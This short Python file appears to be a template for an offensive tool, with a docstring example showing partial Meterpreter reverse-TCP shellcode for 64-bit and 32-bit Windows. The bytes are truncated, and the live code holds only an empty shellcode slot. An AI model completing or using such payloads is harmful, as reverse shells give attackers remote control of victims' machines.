#!/usr/bin/env python3

"""
Example:
--------
shellcode1 =  b""
shellcode1 += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
shellcode1 += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
shellcode1 += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
shellcode1 += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
shellcode1 += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
...skip...
shellcode1 += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
shellcode1 += b"\xf0\xb5\xa2\x56\xff\xd5"

shellcode2 =  b""
shellcode2 += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
shellcode2 += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
...skip...
shellcode2 += b"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
shellcode2 += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff"
shellcode2 += b"\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56"
shellcode2 += b"\x6a\x00\x53\xff\xd5"

shellcodes = {
    1 : [
        "/windows/x64/meterpreter/reverse_tcp", shellcode1
    ],
    2 : [
        "/windows/x86/meterpreter/reverse_tcp", shellcode2
    ]
}
"""


shellcode1 = b""

shellcodes = {
    1 : [
        "", shellcode1
    ]
}